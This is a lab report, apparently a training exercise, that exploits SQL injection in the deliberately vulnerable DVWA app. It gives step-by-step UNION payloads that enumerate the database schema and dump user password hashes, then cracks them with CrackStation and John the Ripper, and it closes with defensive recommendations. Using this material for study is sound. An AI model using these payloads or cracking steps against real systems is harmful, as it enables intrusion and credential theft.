üìù SQL Injection and MD5 Hash Cracking Lab Report

1Ô∏è‚É£ Objective
	‚Ä¢	Understand the principle of SQL Injection vulnerabilities.
	‚Ä¢	Learn how to exploit SQL Injection to enumerate database, tables, columns, and dump data.
	‚Ä¢	Identify MD5 password hashes.
	‚Ä¢	Practice cracking MD5 hashes using tools and techniques.

‚∏ª

2Ô∏è‚É£ Environment

Item	Details
OS	Kali Linux / macOS
Target	DVWA 1.10 (Security Level: Low)
Browser	Chrome / Firefox
Tools	Browser / Burp Suite / Kibana (optional) / John the Ripper


‚∏ª

3Ô∏è‚É£ Procedure

3.1 Verify SQL Injection

Access the target page:

http://<dvwa>/vulnerabilities/sqli/?id=1&Submit=Submit

Test payload:

id=1'

‚úÖ SQL syntax error is displayed ‚Üí confirmed injectable.

‚∏ª

3.2 Determine Column Count

Payloads:

id=1' ORDER BY 1-- -
id=1' ORDER BY 2-- -

‚úÖ Increase column index until an error appears ‚Üí determines the number of columns (in this case, 2).

‚∏ª

3.3 Enumerate Databases

Payload:

id=1' UNION SELECT schema_name, null FROM information_schema.schemata-- -

Output:
	‚Ä¢	information_schema
	‚Ä¢	dvwa

‚∏ª

3.4 Enumerate Tables

Payload:

id=1' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'-- -

Output:
	‚Ä¢	guestbook
	‚Ä¢	users
	‚Ä¢	‚Ä¶

‚∏ª

3.5 Enumerate Columns

Payload:

id=1' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users'-- -

Output:
	‚Ä¢	user_id
	‚Ä¢	first_name
	‚Ä¢	last_name
	‚Ä¢	password
	‚Ä¢	‚Ä¶

‚∏ª

3.6 Dump Data

Payload:

id=1' UNION SELECT concat(first_name,' ',last_name), password FROM users-- -

Output:

User Name	Password (MD5)
admin admin	5f4dcc3b5aa765d61d8327deb882cf99
Gordon Brown	e99a18c428cb38d5f260853678922e03
Hack Me	8d3533d75ae2c3966d7e0d4fcc69216b
Pablo Picasso	0d107d09f5bbe40cade3de5c71e9e9b7
Bob Smith	5f4dcc3b5aa765d61d8327deb882cf99


‚∏ª

4Ô∏è‚É£ MD5 Hash Cracking

4.1 Identify Hash Type
	‚Ä¢	The hashes are 32-character hexadecimal strings ‚Üí typical of MD5.

‚∏ª

4.2 Online Cracking

Visit: https://crackstation.net/
Input:

5f4dcc3b5aa765d61d8327deb882cf99

Result:

password


‚∏ª

4.3 Using John the Ripper

Save hashes to hashes.txt:

5f4dcc3b5aa765d61d8327deb882cf99
e99a18c428cb38d5f260853678922e03
‚Ä¶

Run:

john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

Recovered:

Hash	Plaintext
5f4dcc3b5aa765d61d8327deb882cf99	password
e99a18c428cb38d5f260853678922e03	abc123
8d3533d75ae2c3966d7e0d4fcc69216b	letmein
0d107d09f5bbe40cade3de5c71e9e9b7	test


‚∏ª

5Ô∏è‚É£ Conclusion

‚úÖ Successfully exploited SQL Injection to extract database information.
‚úÖ Enumerated databases, tables, columns, and retrieved user credentials.
‚úÖ Identified and cracked MD5 password hashes.

‚∏ª

6Ô∏è‚É£ Recommendations
	‚Ä¢	Use prepared statements (parameterized queries) to prevent SQLi.
	‚Ä¢	Validate and sanitize user input strictly.
	‚Ä¢	Enforce least privilege on database accounts.
	‚Ä¢	Disable detailed error messages in production.
